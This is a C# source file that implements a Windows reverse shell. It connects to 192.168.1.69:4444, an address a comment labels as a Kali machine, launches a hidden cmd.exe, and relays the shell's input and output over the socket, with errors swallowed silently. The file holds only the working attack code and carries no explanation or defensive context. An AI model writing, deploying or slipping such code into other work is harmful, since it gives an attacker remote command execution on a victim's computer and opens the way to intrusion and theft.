using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Threading;

public class Target
{
    public static void Run()
    {
        string ip   = "192.168.1.69";  // IP Kali
        int    port = 4444;

        try
        {
            var client = new TcpClient(ip, port);
            var stream = client.GetStream();

            var proc = new Process();
            proc.StartInfo.FileName               = "cmd.exe";
            proc.StartInfo.CreateNoWindow         = true;
            proc.StartInfo.UseShellExecute        = false;
            proc.StartInfo.RedirectStandardInput  = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError  = true;
            proc.Start();

            var t1 = new Thread((object o) => {
                try {
                    byte[] buf = new byte[4096];
                    int n;
                    while ((n = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        stream.Write(buf, 0, n);
                } catch { }
            });
            t1.IsBackground = true;
            t1.Start();

            var t2 = new Thread((object o) => {
                try {
                    byte[] buf = new byte[4096];
                    int n;
                    while ((n = proc.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        stream.Write(buf, 0, n);
                } catch { }
            });
            t2.IsBackground = true;
            t2.Start();

            byte[] input = new byte[4096];
            int bytesRead;
            while ((bytesRead = stream.Read(input, 0, input.Length)) > 0)
            {
                proc.StandardInput.BaseStream.Write(input, 0, bytesRead);
                proc.StandardInput.BaseStream.Flush();
            }

            proc.Kill();
            client.Close();
        }
        catch { }
    }
}